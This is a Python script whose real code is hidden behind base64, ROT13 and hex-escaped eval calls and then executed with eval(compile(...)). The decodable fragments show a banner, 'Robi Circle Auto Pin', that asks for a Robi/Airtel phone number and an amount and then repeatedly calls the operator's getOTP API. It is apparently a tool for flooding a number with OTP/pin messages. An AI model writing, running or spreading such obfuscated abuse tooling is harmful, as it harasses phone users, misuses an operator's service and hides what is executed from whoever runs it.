import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzCmZyb20gcmVxdWVzdHMuc3RydWN0dXJlcyBpbXBvcnQgQ2FzZUluc2Vuc2l0aXZlRGljdAojIENWQUxVRQpibHVlID0gJ1wzM1s5NG0nCmxpZ2h0Ymx1ZSA9ICdcMDMzWzk0bScKcmVkID0gJ1wwMzNbOTFtJwp3aGl0ZSA9ICdcMzNbOTdtJwp5ZWxsb3cgPSAnXDMzWzkzbScKZ3JlZW4gPSAnXDAzM1sxOzMybScKY3lhbiA9ICJcMDMzWzk2bSIKZW5kID0gJ1wwMzNbMG0nCgpwcmludChyIiIiCuKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlwrilojilojilojilojilZfilpHilojilojilZHilojilojilZTilZDilZDilojilojilZfilZrilojilojilZfilpHilojilojilZTilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilojilojilZfilpHilojilojilZEK4paI4paI4pWU4paI4paI4pWX4paI4paI4pWR4paI4paI4pWR4paR4paR4paI4paI4pWR4paR4pWa4paI4paI4paI4paI4pWU4pWd4paR4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWU4paI4paI4pWX4paI4paI4pWRCuKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKVmu'
love = 'XJvBXJvBXIyBXIarXJxrXJxrXJvBXJvBXIxrXJxrXJxrXJvBXJvBXIxrXJvBXJvBXIxrXIzhXJvBXJvBXJvBXJvBXIxDevybwvybwvyMUvycUvyMevybwvybwvybwvyMUvyMevybwvybwvybwvybwvybwvyMGvyM3vycUvycUvycUvybwvybwvyMUvycUvycUvycUvyMevybwvybwvybwvybwvybwvyMGvyM3vybwvybwvyMUvycUvyMevybwvybwvybwvyMRX4cJn4cJD4cJq4cnE4cnE4cJn4cJD4cJD4cJq4cnE4cJn4cJD4cJD4cJD4cJD4cJq4cnE4cnE4cnE4cnE4cJn4cJD4cJq4cnE4cnE4cnE4cnE4cJn4cJD4cJD4cJD4cJD4cJq4cnE4cJn4cJD4cJq4cnE4cnE4cJn4cJD4cJD4cJqPvVvVvxXPaOlnJ50XPWpovbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbvXDbXPaOlnJ50VPtvKQNmZ1fmZ20vXlVt8W+EvFOwo250LJA0VCPszV4tYF0gVPNtq3q3YzMuL2Ivo29eYzAioF9On3WuoKIfAwL3VPNtVPVcPtcjpzyhqPtvKT4dXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdXvbdVvxXPaOlnJ50XPWpZQZmJmxkoFVeVvNtVvxXPaOlnJ50XPVvVtbtVPNtVS8hYI5rYF0gYv4hYvjfYF0gYFNtVPNtVPNXVP0gVPNtVPNtVPOmoKZtVPNtVPNtVP0gKlNtPwjtVPNtVPNtVPNtLz9gLzIlVPNtVPNtVPNtCvxX'
god = 'fCAgICAgICAgICAgICAgICAgICAgICAgICB8IAogXC5fICAgICAgICAgICAgICAgICAgIF8uLyAgCiAgICBgYGAtLS4gLiAsIDsgLi0tJycnICAgICAgIAogICAgICAgICAgfCB8ICAgfCAgICAgICAgICAgICAKICAgICAgIC4tPXx8ICB8IHw9LS4gICAKICAgICAgIGAtPSMkJSYlJCM9LScgICAKICAgICAgICAgIHwgOyAgOnwgICAgIAogX18uLC0jJSYkQCUjJiN+LC5fXwoiIiIpCgpwcmludCgiX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iKQoKcHJpbnQoIlwwMzNbMzNtIiArICIgICAgICAgICDilpHilpLilpPiloggUm9iaSBDaXJjbGUgQXV0byBQaW4g4paI4paT4paS4paRICAgICAgICAgIikKCnByaW50KCJcMDMzWzMzbSIgKyAiICAgICAgICAg6qeB4Ly64pmbIGNyZWF0ZWQgYnkgTuqZsE/qmbBZ6pmwT+qZsE7qmbAuIOKZm+C8u+qngiAgICAgICAgIikKCnByaW50KCJcMDMzWzMybSIpCm51bWJlciA9IHN0cihpbnB1dCgiICAgICAgIFs+XSBFbnRlciBUaGUgUm9CaS9BaXJ0ZWwgTnVtYmVyOiAiKSkKYW1vdW50ID0gaW50KGlucHV0KCIgICAgICAgIFs+XSBDaG9pY2UgWW91ciBQaW4gQW1vdW50IDogIikpCgphcGkgPSAiaHR0cHM6Ly9jaXJjbGUucm9iaS5jb20uYmQvbXlsaWZlL2FwcGFwaS9hcHBjYWxsLnBocD9vcD1nZXRPVE'
destiny = 'ZzpTyhCGRmZQNlWzSjpS92MKWmnJ9hCGp4Wz1mnKAxow04BPVtXlOhqJ1vMKVXPzuyLJEypaZtCFOQLKAyFJ5mMJ5mnKEcqzIRnJA0XPxXnTIuMTIlp1fvrP1upUNgn2I5Vy0tCFNvZQNjo2Zjp280BT93n3p0pmO3q280LmNjMmNjBQN0qmtjM3qeqmueMlVXqT90LJkbnKDfoaAyoaDfp2IhqPj9ZPjjYQNXMz9lVTxtnJ4tpzShM2HbLJ1iqJ50XGbXVPNtVUV9p3ElXUWypKIyp3EmYzqyqPuupTxfVTuyLJEypaZ9nTIuMTIlplxhp3EuqUImK2AiMTHcPvNtVPO0o3EuoTucqPf9ZDbtVPNtnJLtpw09VwVjZPV6PvNtVPNtVPNtpUWcoaDbM3WyMJ4tXlNvJ+Xpx10tVvgmqUVbnFfkXFfvVSAAHlOGMJ50YvVcPvNtVPNtVPNtp2IhqPf9ZDbtVPNtMJkmMGbXVPNtVPNtVPOjpzyhqPulMJDeVyiQy10tVvgmqUVbnFfkXFfvVSAAHlOBo3DtH2IhqP4vXDbtVPNtVPNtVT5mMJ50Xm0kPaOlnJ50XTA5LJ4tXlNvKT5poyk0KUEo4bPvKFOHo3EuoPOVnKEmVQbtVvNeVUyyoTkiqlNeVUA0pvu0o3EuoTucqPxcPaOlnJ50XTqlMJIhVPftVykhKUEpqSivaWAqVSEiqTSfVSAyoaDtBvNvVPftrJIfoT93VPftp3ElXUAyoaDcXDcjpzyhqPulMJDtXlNvKT5pqSk0J8BKKFOHo3EuoPOBo3DtH2IhqPN6VPVtXlO5MJkfo3ptXlOmqUVboaAyoaDcVPftVykhVvxXpUWcoaDbL3yuovNeVPWpoykhKUEpqPNtJ+Xpx10tDJkfVREiozHuKT4vXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))